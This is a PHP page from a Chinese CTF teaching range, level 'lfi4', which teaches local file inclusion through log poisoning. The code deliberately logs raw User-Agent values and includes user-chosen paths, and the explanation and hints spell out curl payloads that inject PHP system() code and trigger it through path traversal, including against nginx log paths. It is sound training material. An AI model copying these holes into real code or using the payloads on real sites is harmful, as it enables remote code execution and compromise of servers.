<?php
// ============================================================
// lfi4 · 日志文件包含
// 漏洞1：include('pages/' . $page) 目录穿越（同 lfi1）
// 漏洞2：访问日志把 User-Agent 原样落盘 → 先用 UA 把代码写进日志，
//        再包含日志文件让代码执行
// 本靶场用 PHP 自写迷你日志（cache/access.log）模拟 /var/log/nginx/access.log
// ============================================================
$__dir = __DIR__;
if (!is_dir($__dir . '/cache')) { @mkdir($__dir . '/cache', 0777, true); }
$ua  = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '-';
$rip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-';
@file_put_contents(
    $__dir . '/cache/access.log',
    '[' . date('Y-m-d H:i:s') . '] ' . $rip . ' "' . $ua . '"' . PHP_EOL,
    FILE_APPEND
);

$page = isset($_GET['page']) ? $_GET['page'] : 'home.php';
$included = null; $not_found = false;
if ($page !== '') {
    $target = 'pages/' . $page;
    if (@file_exists($target)) {
        ob_start();
        include($target);
        $included = ob_get_clean();
    } else {
        $not_found = true;
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>lfi4 · 日志文件包含 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#22c55e;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:65%;min-width:220px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
.errbox{background:#3b1519;border:1px solid #7f1d1d;color:#fca5a5;border-radius:8px;padding:10px 14px;margin-top:12px}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
.pages-nav a{color:var(--acc);text-decoration:none;margin-right:12px}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">文件包含 · 第 4 关</span>
<h1>带访问日志的官网 —— 日志文件包含</h1>
<div class="meta">难度：★★★☆☆ 进阶 | 关卡 ID：<code>lfi4</code> · 运行时：PHP</div>
</header>
<!-- OPS-CHECK: /flag_lfi4.txt <?= @file_exists('/flag_lfi4.txt')?'READY':'MISSING(复制 deploy/flag_lfi4.txt 到 /)' ?> cache/ 需可写 -->

<section class="card">
<h2>题目描述</h2>
<p>官网 v4 加了"简易访问统计"：每个访问都会把 <b>User-Agent</b> 记进日志文件（本站自带迷你日志 <code>cache/access.log</code>，模拟真实场景的 <code>/var/log/nginx/access.log</code>）。</p>
<p>include 的老毛病还在（<code>?page=</code> 可穿越）。目标：执行任意命令，读到根目录 <code>/flag_lfi4.txt</code> 的 flag。</p>
<nav class="pages-nav" style="margin-top:8px">
<a href="?page=home.php">首页</a><a href="?page=about.php">关于我们</a>
</nav>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="">
<label>page：<input type="text" name="page" placeholder="例如 home.php" value="<?= htmlspecialchars($page, ENT_QUOTES) ?>"></label>
<button type="submit">打开页面</button>
</form>
<?php if ($not_found): ?>
<div class="errbox">⚠️ include: 文件 <code>pages/<?= htmlspecialchars($page, ENT_QUOTES) ?></code> 不存在</div>
<?php elseif ($included !== null): ?>
<div class="result"><div class="t">include('pages/<?= htmlspecialchars($page, ENT_QUOTES) ?>') 的输出</div>
<pre><?= htmlspecialchars($included, ENT_QUOTES) ?></pre></div>
<?php endif; ?>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p><b>核心思想</b>：LFI 只能"包含已有文件"，那就想办法<b>把自己的代码写进一个会被包含的文件</b>——日志是最常见的落点，因为它记录的内容有一部分是你可控的（User-Agent / Referer / URI）。</p>
<p>攻击两步走：</p>
<ol>
<li><b>污染（Poison）</b>：带着 PHP 代码的 UA 访问一次，代码进日志：
<pre>curl -A "&lt;?php system('cat /flag_lfi4.txt');?&gt;" http://HOST/lfi4/</pre></li>
<li><b>触发</b>：用 LFI 包含日志文件，日志里的 <code>&lt;?php ?&gt;</code> 会被执行：
<pre>curl "http://HOST/lfi4/?page=../cache/access.log"</pre></li>
</ol>
<p>真实场景对应物：</p>
<table>
<tr><th>本靶场（自包含）</th><th>真实环境</th></tr>
<tr><td><code>cache/access.log</code>（PHP 自写）</td><td><code>/var/log/nginx/access.log</code>、<code>/var/log/apache2/access.log</code>（穿越 payload：<code>?page=../../../../../var/log/nginx/access.log</code>）</td></tr>
<tr><td>UA 写入</td><td>UA / Referer / 恶意 URI 同理，nginx 都会记录</td></tr>
</table>
<p>其他常见的"代码写入面"：PHP session 文件（下一关）、<code>/proc/self/environ</code>（HTTP 头注入进程环境，旧系统）、上传的临时文件、错误日志 error.log。</p>
<p>坑点提醒：日志里每次访问都会追加，包含时<b>所有</b>已写入的 PHP 片段都会执行；真实 nginx 日志权限通常只有 root 可读，php-fpm 用户读不到时要找权限松的日志。</p>
</section>

<section class="card">
<h2>渐进提示</h2>
<details><summary>提示 1：找"你能控制的写入点"</summary><p>题目说每个请求的 User-Agent 都会被记录。UA 是你请求头里随便改的东西……先想想它能往哪儿写。</p></details>
<details><summary>提示 2：写进去，再包出来</summary><p>第一步：把 <code>&lt;?php system('cat /flag_lfi4.txt');?&gt;</code> 放进 UA 访问一次；第二步：用上一关的穿越技巧包含 <code>cache/access.log</code>。</p></details>
<details><summary>提示 3：payload</summary><p><code>curl -A "&lt;?php system('cat /flag_lfi4.txt');?&gt;" http://HOST/lfi4/</code><br>然后 <code>curl "http://HOST/lfi4/?page=../cache/access.log"</code></p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="../lfi3">← 上一关：lfi3</a><a href="../lfi5">下一关：lfi5 · session 包含 / RFI →</a></nav>
<footer>CTF Web 教学式靶场 · B 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=lfi4&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
